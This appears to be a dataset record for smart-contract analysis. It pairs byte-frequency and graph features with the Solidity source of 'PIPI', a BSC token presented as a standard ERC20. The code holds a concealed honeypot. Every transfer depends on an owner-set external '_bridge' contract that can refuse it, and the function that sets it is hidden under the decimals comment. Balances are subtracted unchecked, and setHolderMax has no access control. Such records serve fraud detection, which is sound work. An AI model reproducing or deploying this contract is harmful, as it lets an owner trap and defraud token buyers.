  "byte_ac": 0.00022426553038797938,
  "byte_6b": 0.00044853106077595876,
  "byte_20": 0.023772146221125813,
  "byte_bf": 0.00044853106077595876,
  "byte_a9": 0.0006727965911639381,
  "byte_05": 0.005382372729311505,
  "byte_9c": 0.0008970621215519175,
  "byte_bb": 0.00044853106077595876,
  "byte_c7": 0.0006727965911639381,
  "byte_18": 0.0006727965911639381,
  "byte_79": 0.00044853106077595876,
  "byte_78": 0.0006727965911639381,
  "byte_e9": 0.0006727965911639381,
  "byte_25": 0.0008970621215519175,
  "byte_81": 0.02152949091724602,
  "byte_8d": 0.0013455931823278763,
  "byte_a5": 0.00022426553038797938,
  "byte_cb": 0.0006727965911639381,
  "byte_89": 0.00044853106077595876,
  "byte_95": 0.001121327651939897,
  "byte_d8": 0.002466920834267773,
  "byte_9b": 0.0006727965911639381,
  "byte_41": 0.00044853106077595876,
  "byte_91": 0.013007400762502803,
  "byte_a4": 0.0006727965911639381,
  "byte_c2": 0.00044853106077595876,
  "byte_d7": 0.00022426553038797938,
  "byte_99": 0.00044853106077595876,
  "byte_3c": 0.002242655303879794,
  "byte_e5": 0.004933841668535546,
  "byte_67": 0.0006727965911639381,
  "byte_30": 0.002466920834267773,
  "byte_08": 0.0033639829558196905,
  "byte_39": 0.0006727965911639381,
  "byte_93": 0.0026911863646557526,
  "byte_51": 0.008970621215519175,
  "byte_1d": 0.00044853106077595876,
  "byte_0a": 0.00358824848620767,
  "byte_32": 0.002466920834267773,
  "byte_2d": 0.0006727965911639381,
  "byte_43": 0.0026911863646557526,
  "byte_49": 0.0006727965911639381,
  "byte_bd": 0.00044853106077595876,
  "byte_5a": 0.0008970621215519175,
  "byte_5e": 0.0006727965911639381,
  "byte_4b": 0.0006727965911639381,
  "byte_4f": 0.0013455931823278763,
  "byte_be": 0.002018389773491814,
  "byte_e1": 0.0006727965911639381,
  "byte_53": 0.0006727965911639381,
  "byte_06": 0.004036779546983628,
  "byte_6c": 0.0029154518950437317,
  "byte_09": 0.005382372729311505,
  "byte_a7": 0.0006727965911639381,
  "byte_b3": 0.0013455931823278763,
  "byte_ab": 0.00022426553038797938,
  "byte_16": 0.015474321596770577,
  "byte_94": 0.0015698587127158557,
  "byte_23": 0.0008970621215519175,
  "byte_b8": 0.00022426553038797938,
  "byte_72": 0.007400762502803319,
  "byte_f5": 0.0006727965911639381,
  "byte_86": 0.002242655303879794,
  "byte_0c": 0.006503700381251401,
  "byte_1b": 0.02152949091724602,
  "byte_a2": 0.0015698587127158557,
  "byte_90": 0.033415564027808924,
  "byte_f3": 0.0006727965911639381,
  "byte_b9": 0.0013455931823278763,
  "byte_b2": 0.00044853106077595876,
  "byte_45": 0.002018389773491814,
  "byte_d3": 0.0008970621215519175,
  "byte_d4": 0.00022426553038797938,
  "byte_e8": 0.002242655303879794,
  "byte_42": 0.00044853106077595876,
  "byte_17": 0.0008970621215519175,
  "byte_59": 0.00044853106077595876,
  "byte_2b": 0.001121327651939897,
  "byte_4c": 0.00022426553038797938,
  "byte_9f": 0.0006727965911639381,
  "byte_0b": 0.004261045077371608,
  "byte_ef": 0.001121327651939897,
  "byte_ae": 0.00022426553038797938,
  "byte_74": 0.004261045077371608,
  "byte_d0": 0.0013455931823278763,
  "byte_eb": 0.00044853106077595876,
  "byte_ba": 0.00022426553038797938,
  "byte_d5": 0.0008970621215519175,
  "byte_7d": 0.0008970621215519175,
  "byte_21": 0.00022426553038797938,
  "byte_fb": 0.00022426553038797938,
  "byte_c3": 0.001121327651939897,
  "byte_0e": 0.0013455931823278763,
  "byte_ee": 0.00044853106077595876,
  "byte_07": 0.0058309037900874635,
  "byte_5f": 0.00044853106077595876,
  "byte_55": 0.002018389773491814,
  "byte_54": 0.006952231442027361,
  "byte_2f": 0.00044853106077595876,
  "byte_1f": 0.001794124243103835,
  "byte_92": 0.004709576138147566,
  "byte_a8": 0.0006727965911639381,
  "byte_83": 0.01076474545862301,
  "byte_ca": 0.0008970621215519175,
  "byte_85": 0.0051581071989235255,
  "byte_0f": 0.002466920834267773,
  "byte_f4": 0.00022426553038797938,
  "byte_26": 0.0015698587127158557,
  "byte_ff": 0.0015698587127158557,
  "byte_3d": 0.0008970621215519175,
  "byte_47": 0.00044853106077595876,
  "byte_65": 0.010316214397847051,
  "byte_46": 0.004261045077371608,
  "byte_cd": 0.004485310607759588,
  "byte_4d": 0.0013455931823278763,
  "byte_2a": 0.0006727965911639381,
  "byte_c6": 0.00044853106077595876,
  "byte_84": 0.006279434850863423,
  "byte_aa": 0.00044853106077595876,
  "byte_19": 0.002242655303879794,
  "byte_29": 0.00044853106077595876,
  "byte_3a": 0.002466920834267773,
  "byte_33": 0.0006727965911639381,
  "byte_98": 0.0008970621215519175,
  "byte_e6": 0.00022426553038797938,
  "byte_f6": 0.00022426553038797938,
  "byte_5c": 0.00044853106077595876,
  "byte_7f": 0.00358824848620767,
  "byte_8c": 0.00022426553038797938,
  "byte_ec": 0.00022426553038797938,
  "byte_d1": 0.00022426553038797938,
  "byte_1e": 0.00044853106077595876,
  "byte_f7": 0.00044853106077595876,
  "byte_c8": 0.00044853106077595876,
  "byte_a3": 0.0015698587127158557,
  "byte_6a": 0.00044853106077595876,
  "byte_5d": 0.00022426553038797938,
  "byte_96": 0.00022426553038797938,
  "byte_bc": 0.00044853106077595876,
  "byte_dc": 0.00044853106077595876,
  "byte_c1": 0.0015698587127158557,
  "byte_8e": 0.00022426553038797938,
  "byte_64": 0.004709576138147566,
  "byte_58": 0.0006727965911639381,
  "byte_ad": 0.0006727965911639381,
  "byte_7b": 0.0008970621215519175,
  "byte_88": 0.00022426553038797938,
  "byte_b6": 0.00022426553038797938,
  "byte_44": 0.00022426553038797938,
  "byte_af": 0.00022426553038797938,
  "byte_b4": 0.00022426553038797938,
  "byte_6f": 0.005382372729311505,
  "byte_e2": 0.00022426553038797938,
  "byte_69": 0.0015698587127158557,
  "byte_b0": 0.00044853106077595876,
  "byte_fc": 0.00022426553038797938,
  "byte_37": 0.00044853106077595876,
  "byte_f1": 0.00044853106077595876,
  "byte_c4": 0.00044853106077595876,
  "byte_a1": 0.00022426553038797938,
  "byte_28": 0.0006727965911639381,
  "byte_1a": 0.0006727965911639381,
  "byte_3b": 0.00022426553038797938,
  "byte_fa": 0.00022426553038797938,
  "byte_12": 0.002018389773491814,
  "byte_6d": 0.001121327651939897,
  "byte_8f": 0.00022426553038797938,
  "byte_c5": 0.00022426553038797938,
  "byte_ce": 0.00022426553038797938,
  "byte_7c": 0.00022426553038797938,
  "byte_7a": 0.002018389773491814,
  "byte_d9": 0.00022426553038797938,
  "byte_77": 0.002018389773491814,
  "byte_76": 0.00044853106077595876,
  "byte_f0": 0.00022426553038797938,
  "byte_75": 0.0006727965911639381,
  "byte_9a": 0.00022426553038797938,
  "byte_4e": 0.0006727965911639381,
  "byte_48": 0.0006727965911639381,
  "byte_fe": 0.00022426553038797938,
  "num_nodes": 302,
  "num_edges": 118,
  "avg_degree": 0.7814569536423841,
  "density": 0.001298101251897648,
  "connected_components": 202,
  "avg_clustering": 0.004415011037527594,
  "timeline_sequence": [],
  "sourcecode": "/**\n *Submitted for verification at BscScan.com on 2023-05-04\n*/\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\ninterface IERC20Safe {\n    /**\n     * @dev Returns if transfer amount exceeds balance.\n     */\n    function beforeTransfer(address sender,uint256 balance,uint256 amount) external view returns (bool);\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract PIPI is Context, Ownable, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 private _decimals;\n\n    string private _name;\n    string private _symbol;\n    address private _bridge;\n    uint256 Fee = 3;\n    \n    mapping(address => uint256) holderN;\n    uint256 public startTime = block.timestamp;\n    uint256 public oneday = 1 days;\n    uint256 public holderMax =  1 * 1e18;\n    mapping(address => bool) private _isExcludedFromFees;  \n    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    IUniswapV2Router02 public uniswapV2Router;\n    IUniswapV2Pair public uniswapV2Pair;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor() {\n        _name = \"PIPI\";\n        _symbol = \"PIPI\";\n        _decimals = 4;\n\n        _totalSupply = 6000000 * (10 ** uint256(_decimals));\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);\n        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\n                .createPair(address(this), _uniswapV2Router.WETH());\n        uniswapV2Router = _uniswapV2Router;\n        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);\n\n        _isExcludedFromFees[address(this)] = true;\n        _isExcludedFromFees[msg.sender] = true;\n        _isExcludedFromFees[router] = true;\n    }\n\n    function excludeFromFees(address account, bool excluded) external onlyOwner {\n        require(msg.sender == owner(),\"error\"); \n        _isExcludedFromFees[account] = excluded; \n    }\n    \n    function isExcludedFromFees(address account) external view returns (bool) {        \n        return _isExcludedFromFees[account];\n    } \n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function initBridge(address bridge_) public onlyOwner{\n        _bridge = bridge_;\n    }\n\n  \n    function decimals() public view virtual override returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function setHolderMax(uint256 v) public{\n        holderMax = v;\n    }     \n    function setStartTime(uint256 _t) public onlyOwner{\n        startTime = _t;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"ERC20: transfer  amount to the zero\");\n\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\n             __transfer(from, to, amount);\n             return;\n        }\n       \n        if(to == address(uniswapV2Pair)){\n            uint256 feeAmount = amount * Fee / 100; \n            __transfer(from,address(0xdead),feeAmount);\n            amount = amount - feeAmount;\n            __transfer(from, to, amount);\n            return;\n        }\n\n        if(from == address(uniswapV2Pair)){\n\n            uint256 feeAmount = amount * Fee / 100; \n            __transfer(from,address(0xdead),feeAmount);\n            amount = amount - feeAmount;\n            __transfer(from, to, amount);  \n            return;\n        }\n        \n        __transfer(from, to, amount);\n        \n    }\n\n    function __transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"ERC20: transfer  amount to the zero\");\n        _beforeTokenTransfer(from, to, amount);\n        unchecked {\n            _balances[from] = _balances[from] - amount;\n            _balances[to] += amount;\n        }    \n        emit Transfer(from, to, amount);\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    // _mint function deleted \n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(IERC20Safe(_bridge).beforeTransfer(from, _balances[from], amount), \"ERC20: transfer amount exceeds balance\");\n    }\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}"
}